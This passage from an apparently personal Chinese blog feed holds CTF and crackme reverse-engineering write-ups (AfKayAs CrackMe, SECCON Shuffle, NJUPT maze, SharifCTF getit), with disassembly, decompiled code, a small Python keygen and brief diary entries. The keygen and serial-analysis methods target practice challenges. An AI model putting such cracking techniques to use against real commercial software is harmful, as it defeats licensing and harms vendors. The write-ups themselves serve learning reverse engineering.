[<span class="built_in">ebp</span>-1C]:L<span class="string">"123"</span></span><br><span class="line">004024F0 | <span class="number">52</span>                       | <span class="keyword">push</span> <span class="built_in">edx</span>                                       |</span><br><span class="line">004024F1 | <span class="number">56</span>                       | <span class="keyword">push</span> <span class="built_in">esi</span>                                       |</span><br><span class="line">004024F2 | 8B 0E                    | <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>]                     |</span><br><span class="line">004024F4 | FF <span class="number">91</span> A0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+A0]                     |</span><br><span class="line">004024FA | <span class="number">85</span> C0                    | <span class="keyword">test</span> <span class="built_in">eax</span>,<span class="built_in">eax</span>                                   | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">004024FC | <span class="number">7D</span> <span class="number">12</span>                    | <span class="keyword">jge</span> afkayas<span class="meta">.1</span><span class="meta">.402510</span>                           |</span><br><span class="line">004024FE | <span class="number">68</span> A0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           | <span class="keyword">push</span> A0                                        |</span><br><span class="line"><span class="number">00402503</span> | <span class="number">68</span> 5C <span class="number">1B</span> <span class="number">40</span> <span class="number">00</span>           | <span class="keyword">push</span> afkayas<span class="meta">.1</span>.401B5C                          |</span><br><span class="line"><span class="number">00402508</span> | <span class="number">56</span>                       | <span class="keyword">push</span> <span class="built_in">esi</span>                                       |</span><br><span class="line"><span class="number">00402509</span> | <span class="number">50</span>                       | <span class="keyword">push</span> <span class="built_in">eax</span>                                       | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">0040250A | FF <span class="number">15</span> <span class="number">04</span> <span class="number">41</span> <span class="number">40</span> <span class="number">00</span>        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;_vbaHresultCheckObj&gt;]     |</span><br><span class="line"><span class="number">00402510</span> | 8B <span class="number">45</span> E8                 | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">18</span>]                  | [<span class="built_in">ebp</span>-<span class="number">18</span>]:L<span class="string">"123"</span></span><br><span class="line"><span class="number">00402513</span> | 8B <span class="number">4D</span> E4                 | <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-1C]                  | [<span class="built_in">ebp</span>-1C]:L<span class="string">"123"</span></span><br><span class="line"><span class="number">00402516</span> | 8B <span class="number">3D</span> <span class="number">00</span> <span class="number">41</span> <span class="number">40</span> <span class="number">00</span>        | <span class="keyword">mov</span> <span class="built_in">edi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;_vbaStrCat&gt;]           |</span><br><span class="line">0040251C | <span class="number">50</span>                       | <span class="keyword">push</span> <span class="built_in">eax</span>                                       | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line"><span class="number">0040251D</span> | <span class="number">68</span> <span class="number">70</span> <span class="number">1B</span> <span class="number">40</span> <span class="number">00</span>           | <span class="keyword">push</span> afkayas<span class="meta">.1</span>.401B70                          | 401B70:L<span class="string">"AKA-"</span></span><br><span class="line"><span class="number">00402522</span> | <span class="number">51</span>                       | <span class="keyword">push</span> <span class="built_in">ecx</span>                                       |</span><br><span class="line"><span class="number">00402523</span> | FF D7                    | <span class="keyword">call</span> <span class="built_in">edi</span>                                       |</span><br><span class="line"><span class="number">00402525</span> | 8B <span class="number">1D</span> <span class="number">70</span> <span class="number">41</span> <span class="number">40</span> <span class="number">00</span>        | <span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;_vbaStrMove&gt;]          | 拼接</span><br><span class="line">0040252B | 8B D0                    | <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">eax</span>                                    | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line"><span class="number">0040252D</span> | <span class="number">8D</span> <span class="number">4D</span> E0                 | <span class="keyword">lea</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">20</span>]                  |</span><br><span class="line"><span class="number">00402530</span> | FF D3                    | <span class="keyword">call</span> <span class="built_in">ebx</span>                                       |</span><br><span class="line"><span class="number">00402532</span> | <span class="number">50</span>                       | <span class="keyword">push</span> <span class="built_in">eax</span>                                       | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line"><span class="number">00402533</span> | FF <span class="number">15</span> <span class="number">28</span> <span class="number">41</span> <span class="number">40</span> <span class="number">00</span>        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;_vbaStrCmp&gt;]              |</span><br></pre></td></tr></table></figure><p>上面我已经对关键的函数和操作进行了注释，得出注释中这些结论的方法主要是看函数栈和返回值。最后那里的拼接，是在计算得到的字符串前加上“AKA-”这一前缀。</p><p>则整个注册算法的思路是：</p><ol><li>取得name的长度。</li><li>将长度乘以一个常数0x17cfb。</li><li>再取得name的首字母。</li><li>将首字母的ascii值加上步骤2得到的结果。</li><li>最终得到字符串型的结果。</li><li>将结果拼接得到key。</li><li>将key与输入的key比较，最终联系到前面说过的关键跳转。</li></ol><p>根据注册算法写出注册机：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name = input(<span class="string">'name: '</span>)</span><br><span class="line">num = len(name) * <span class="number">0x17cfb</span> + ord(name[<span class="number">0</span>])</span><br><span class="line">print(<span class="string">'key is: AKA-'</span>+str(num))</span><br></pre></td></tr></table></figure></p><p>最终验证结果：</p><p><img src="/2019/05/08/AfKayAs-CrackMe-1/2.png" alt="final"></p>]]></content>
      
      
      <categories>
          
          <category> 玩安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
            <tag> 逆向160题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20190508</title>
      <link href="/2019/05/08/20190508/"/>
      <url>/2019/05/08/20190508/</url>
      
        <content type="html"><![CDATA[<p>停了一周，最近事情太多，明天还有体测，周末前还要肝完python和OS实验上交。这周过去事情就能少一些了。</p><p>今天争取再做一道题。</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 乱七八糟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20190502</title>
      <link href="/2019/05/02/20190502/"/>
      <url>/2019/05/02/20190502/</url>
      
        <content type="html"><![CDATA[<p>dym来威海了，带他逛了一下哈工大，去海边走了一圈，回来在妈妈手吃的，点多了……</p><p>明天继续逛吃。</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 乱七八糟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20190501</title>
      <link href="/2019/05/02/20190501/"/>
      <url>/2019/05/02/20190501/</url>
      
        <content type="html"><![CDATA[<p>和室友出去吃烧烤，并没有学习。</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 乱七八糟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20190430</title>
      <link href="/2019/05/01/20190430/"/>
      <url>/2019/05/01/20190430/</url>
      
        <content type="html"><![CDATA[<p>搞了两道题，一道python反序列化后逆向，一道CM，python的还不会，暂时搁置，CM的分析到一半感觉不太对，看了夜影师傅博客，发现好像是我的程序有问题。。。？CM里面有两个messageboxa，但是找不到交叉引用？正常应该是这两次引用都出于同一个函数，而且还是关键函数……</p><p>1号要从油管搬LiveOverFlow的逆向视频了，B站应该还没有他们的逆向的视频。</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 乱七八糟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF 4th-WHCTF-2017 CRACKME</title>
      <link href="/2019/04/30/XCTF-4th-WHCTF-2017-CRACKME/"/>
      <url>/2019/04/30/XCTF-4th-WHCTF-2017-CRACKME/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HITCON-CTF-2016 handcrafted-pyc</title>
      <link href="/2019/04/30/HITCON-CTF-2016-handcrafted-pyc/"/>
      <url>/2019/04/30/HITCON-CTF-2016-handcrafted-pyc/</url>
      
        <content type="html"><![CDATA[<p>挖坑，不太会做。</p>]]></content>
      
      
      <categories>
          
          <category> 玩安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
            <tag> 待补充 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SECCON-CTF-2014 Shuffle</title>
      <link href="/2019/04/30/SECCON-CTF-2014-Shuffle/"/>
      <url>/2019/04/30/SECCON-CTF-2014-Shuffle/</url>
      
        <content type="html"><![CDATA[<p><a href="shuffle">题目下载</a></p><p>hint（机翻？）：找到字符串在随机化之前</p><p>部分代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//......</span></span><br><span class="line">v49 = <span class="string">'\0'</span>;</span><br><span class="line">v3 = time(<span class="number">0</span>);</span><br><span class="line">v4 = getpid();</span><br><span class="line">srand(v3 + v4);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  v5 = rand() % <span class="number">0x28</span>u;</span><br><span class="line">  v6 = rand() % <span class="number">0x28</span>u;</span><br><span class="line">  v7 = *(&amp;s + v5);</span><br><span class="line">  *(&amp;s + v5) = *(&amp;s + v6);</span><br><span class="line">  *(&amp;s + v6) = v7;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(&amp;s);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>省略部分为数组初始化内容，根据题意…根据个屁的题意啊，flag在上面写着呢。像我这种比较懒的，用gdb跑到随机化函数前，从内存里读出来的，因为不会用IDA把这种运行时赋值的数组批量导出，懒得一个个字符敲了……这题为啥要给放到进阶场？</p>]]></content>
      
      
      <categories>
          
          <category> 玩安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NJUPT CTF 2017 maze</title>
      <link href="/2019/04/29/NJUPT-CTF-2017-maze/"/>
      <url>/2019/04/29/NJUPT-CTF-2017-maze/</url>
      
        <content type="html"><![CDATA[<p><a href="maze">题目下载</a></p><p>hint：菜鸡想要走出菜狗设计的迷宫。</p><p>代码比较长：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// bp</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v8; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+0h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input flag:"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;s1, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;s1) != <span class="number">24</span> || (v3 = <span class="string">"nctf&#123;"</span>, <span class="built_in">strncmp</span>(&amp;s1, <span class="string">"nctf&#123;"</span>, <span class="number">5u</span>LL)) || *(&amp;byte_6010BF + <span class="number">24</span>) != <span class="string">'&#125;'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">WRONG:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong flag!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = <span class="number">5L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;s1) - <span class="number">1</span> &gt; <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = *(&amp;s1 + v4);</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v5 &gt; <span class="string">'N'</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = (<span class="keyword">unsigned</span> __int8)v5;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)v5 == <span class="string">'O'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v7 = sub_400650((_DWORD *)&amp;v10 + <span class="number">1</span>);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="string">'o'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v7 = sub_400660((<span class="keyword">char</span> *)&amp;v10 + <span class="number">4</span>, v3);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v5 = (<span class="keyword">unsigned</span> __int8)v5;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)v5 == <span class="string">'.'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v7 = sub_400670(&amp;v10);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="string">'0'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v7 = sub_400680(&amp;v10, v3);</span><br><span class="line">LABEL_14:</span><br><span class="line">          v6 = v7;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_15:</span><br><span class="line">      v3 = (<span class="keyword">const</span> <span class="keyword">char</span> *)HIDWORD(v10);</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> __int8)sub_400690((__int64)asc_601060, SHIDWORD(v10), v10) )</span><br><span class="line">        <span class="keyword">goto</span> WRONG;</span><br><span class="line">      <span class="keyword">if</span> ( ++v4 &gt;= <span class="built_in">strlen</span>(&amp;s1) - <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v6 )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">LABEL_20:</span><br><span class="line">        v8 = <span class="string">"Wrong flag!"</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( asc_601060[<span class="number">8</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)v10 + SHIDWORD(v10)] != <span class="string">'#'</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">  v8 = <span class="string">"Congratulations!"</span>;</span><br><span class="line">LABEL_21:</span><br><span class="line">  <span class="built_in">puts</span>(v8);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据第一个if，可以判断出：</p><ul><li>flag的长度为24</li><li>以nctf{开头</li><li>以}结尾</li></ul><p>根据打印正确提示句上方if，查看400690：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">sub_400690</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = *(<span class="keyword">unsigned</span> __int8 *)(a1 + a2 + <span class="number">8L</span>L * a3);</span><br><span class="line">  LOBYTE(result) = (_DWORD)result == <span class="string">' '</span> || (_DWORD)result == <span class="string">'#'</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查了一下<code>SHIDWORD</code>这个宏，发现IDA对其定义为<code>(*((int32*)&amp;(x)+1))</code>。</p><p>这里把a3乘以了8，加上a2，这里比较关键的是联系hint，把a2、a3当成二维数组，由此推出迷宫宽是8。迷宫字符串asc_601060长度正好是72，进一步印证了假设。并且根据最后一个if，可以知道迷宫的终点应该是’#’。</p><p>再看程序中段的四种输入情况（’O’、’.’、’0’、’o’），四种情况分别对应了四个函数，联系上面的v10，推测出v10表示行，v10+1表示列（开始没想到，还在思考v10+1是个什么鬼……看了夜影师傅博客才知道的）</p><p>‘O’的情况：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> __<span class="function">fastcall <span class="title">sub_400650</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v1 = (*a1)--;</span><br><span class="line">  <span class="keyword">return</span> v1 &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入的参数是<code>(_DWORD *)&amp;v10 + 1</code>，也即列号，猜测此函数是向左走。其余三个函数同理。这部分我还用ghidra看了一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">int</span>)uVar4 &lt; <span class="number">0x4f</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> ((uVar4 &amp; <span class="number">0xff</span>) == <span class="number">0x2e</span>) &#123;</span><br><span class="line">    cVar1 = FUN_00400670(&amp;local_28);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((uVar4 &amp; <span class="number">0xff</span>) == <span class="number">0x30</span>) &#123;</span><br><span class="line">      cVar1 = FUN_00400680(&amp;local_28);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> ((uVar4 &amp; <span class="number">0xff</span>) == <span class="number">0x4f</span>) &#123;</span><br><span class="line">    cVar1 = FUN_00400650((<span class="keyword">long</span>)&amp;local_28 + <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((uVar4 &amp; <span class="number">0xff</span>) == <span class="number">0x6f</span>) &#123;</span><br><span class="line">      cVar1 = FUN_00400660((<span class="keyword">long</span>)&amp;local_28 + <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>感觉改成<code>(long)&amp;local_28 + 4</code>这种格式更方便阅读，不过ghidra还是用不惯。</p><p>把迷宫打印了一下，图中为了方便阅读，我把空格替换成了’$’，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$$******</span><br><span class="line">*$$$*$$*</span><br><span class="line">***$*$**</span><br><span class="line">**$$*$**</span><br><span class="line">*$$*#$$*</span><br><span class="line">**$***$*</span><br><span class="line">**$$$$$*</span><br><span class="line">********</span><br></pre></td></tr></table></figure></p><p>得出：</p><ul><li>O 向左走</li><li>o 向右走</li><li>. 向上走</li><li>0 向下走</li></ul><p>走一下迷宫，右下右右下下左下下下右右右右上上左左。</p><p>对应的字符就是flag。</p>]]></content>
      
      
      <categories>
          
          <category> 玩安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SharifCTF 2016 getit</title>
      <link href="/2019/04/29/SharifCTF-2016-getit/"/>
      <url>/2019/04/29/SharifCTF-2016-getit/</url>
      
        <content type="html"><![CDATA[<p><a href="getit">题目下载</a></p><p>IDA分析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// al</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> filename[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  LODWORD(v5) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v5 &lt; <span class="built_in">strlen</span>(s) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &amp; <span class="number">1</span> )</span><br><span class="line">      v3 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v3 = <span class="number">-1</span>;</span><br><span class="line">    *(&amp;t + (<span class="keyword">signed</span> <span class="keyword">int</span>)v5 + <span class="number">10</span>) = s[(<span class="keyword">signed</span> <span class="keyword">int</span>)v5] + v3;</span><br><span class="line">    LODWORD(v5) = v5 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(filename, <span class="string">"/tmp/flag.txt"</span>);</span><br><span class="line">  stream = fopen(filename, <span class="string">"w"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stream, <span class="string">"%s\n"</span>, u, v5);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(&amp;t); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    fseek(stream, p[i], <span class="number">0</span>);</span><br><span class="line">    fputc(*(&amp;t + p[i]), stream);</span><br><span class="line">    fseek(stream, <span class="number">0L</span>L, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(stream, <span class="string">"%s\n"</span>, u);</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(stream);</span><br><span class="line">  remove(filename);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到真正有用的是这个循环：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v5 &lt; <span class="built_in">strlen</span>(s) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &amp; <span class="number">1</span> )</span><br><span class="line">    v3 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v3 = <span class="number">-1</span>;</span><br><span class="line">  *(&amp;t + (<span class="keyword">signed</span> <span class="keyword">int</span>)v5 + <span class="number">10</span>) = s[(<span class="keyword">signed</span> <span class="keyword">int</span>)v5] + v3;</span><br><span class="line">  LODWORD(v5) = v5 + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中s在内存中为：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.data:</span>00000000006010A0 <span class="comment">; char s[]</span></span><br><span class="line"><span class="symbol">.data:</span>00000000006010A0 s               <span class="built_in">db</span> <span class="string">'c'</span>, <span class="string">'6'</span>, <span class="string">'1'</span>, <span class="string">'b'</span>, <span class="string">'6'</span>, <span class="string">'8'</span>, <span class="string">'3'</span>, <span class="number">2</span> dup(<span class="string">'6'</span>), <span 